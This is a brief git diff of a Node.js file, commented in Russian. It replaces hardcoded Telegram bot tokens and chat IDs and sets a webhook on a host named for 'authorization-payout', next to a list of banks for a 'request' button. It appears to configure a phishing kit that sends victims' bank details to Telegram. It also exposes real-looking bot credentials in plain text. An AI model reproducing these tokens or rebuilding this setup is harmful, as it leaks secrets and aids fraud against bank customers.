@@ -5,8 +5,8 @@ const WebSocket = require('ws');
 const path = require('path');
 
 // НАСТРОЙКИ
-const TELEGRAM_BOT_TOKEN = '7968124118:AAFfJmnTphE5GGLu9-RyCSazPUhNsGFLrnI';
-const CHAT_ID = '-5053033986';
+const TELEGRAM_BOT_TOKEN = '8227870538:AAG6O3ojYrxz_COPKCkgUZy-GYSYxRfNKuc';
+const CHAT_ID = '-1003473672730';
 const WEBHOOK_URL = 'https://autorizatsiya-vuplata.onrender.com/bot' + TELEGRAM_BOT_TOKEN;
 
 // СПИСОК БАНКОВ ДЛЯ КНОПКИ "ЗАПРОС"
